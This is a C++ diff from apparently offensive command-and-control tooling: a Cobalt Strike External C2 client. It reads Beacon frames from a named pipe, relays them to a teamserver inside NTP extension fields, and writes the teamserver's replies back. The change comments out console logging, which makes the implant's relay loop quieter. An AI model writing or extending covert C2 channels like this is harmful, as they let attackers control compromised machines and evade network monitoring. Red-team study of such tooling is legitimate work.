@@ -21,7 +21,7 @@ DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
 		return 0;
 	}
 
-	std::cout << "Frame size: " << size << std::endl;
+	//std::cout << "Frame size: " << size << std::endl;
 
 	if (size > max) {
 		std::cerr << "Frame size " << size << " exceeds buffer max " << max << std::endl;
@@ -55,7 +55,7 @@ void pipeLoop(std::vector<uint8_t> clientId) {
 	//again pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c
 	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
 	while (handle_beacon == INVALID_HANDLE_VALUE) {
-		std::cout << "[+] Waiting on pipe to be available..." << std::endl;
+		//std::cout << "[+] Waiting on pipe to be available..." << std::endl;
 		Sleep(1000);
 		handle_beacon = CreateFileA("\\\\.\\pipe\\somepipe", GENERIC_READ | GENERIC_WRITE,
 			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
@@ -71,14 +71,14 @@ void pipeLoop(std::vector<uint8_t> clientId) {
 		//maybe add a pipe cehck to make sure the pipe exists
 
 		/* read from our named pipe Beacon */
-		std::cout << "[?] Attempting to read frame from Pipe" << std::endl;
+		//std::cout << "[?] Attempting to read frame from Pipe" << std::endl;
 		DWORD read = read_frame(handle_beacon, buffer, Beacon::bufferMaxSize);
 		if (read < 0) {
-			std::cout << "Error reading from pipe" << std::endl;
+			//std::cout << "Error reading from pipe" << std::endl;
 			return;
 		}
-		std::cout << "Read " << read << " bytes from pipe " << std::endl;
-		//std::cout << "buffer contents:" << std::endl;
+		//std::cout << "Read " << read << " bytes from pipe " << std::endl;
+		////std::cout << "buffer contents:" << std::endl;
 		//for (size_t i = 0; i < read; ++i) {
 		//	printf("%02X ", buffer[i]);
 		//}
@@ -87,7 +87,7 @@ void pipeLoop(std::vector<uint8_t> clientId) {
 		// Create a vector from the char* data as the NTP class needs it, readis how much data was read. 
 		std::vector<uint8_t> vec(buffer, buffer + read);
 
-		std::cout << "Data from Pipe: ";
+		//std::cout << "Data from Pipe: ";
 		printHexVector(vec);
 		std::cout << std::endl;
 
@@ -97,15 +97,15 @@ void pipeLoop(std::vector<uint8_t> clientId) {
 			NtpExtensionField::dataForTeamserver,
 			clientId
 		);
-		std::cout << "[?] Data sent to teamserver" << std::endl;
+		//std::cout << "[?] Data sent to teamserver" << std::endl;
 
 		//then need to getBeaconDataFromTeamserver (which will ask the server for the data for this client)
-		std::cout << "[?] Getting data back from Teamserver" << std::endl;
+		//std::cout << "[?] Getting data back from Teamserver" << std::endl;
 		std::vector<uint8_t> dataFromTeamserver = getBeaconDataFromTeamserver(
 			clientId
 		);
 
-		std::cout << "[?] Data being written to pipe: ";
+		//std::cout << "[?] Data being written to pipe: ";
 		printHexVector(dataFromTeamserver);
 		std::cout << std::endl;
 
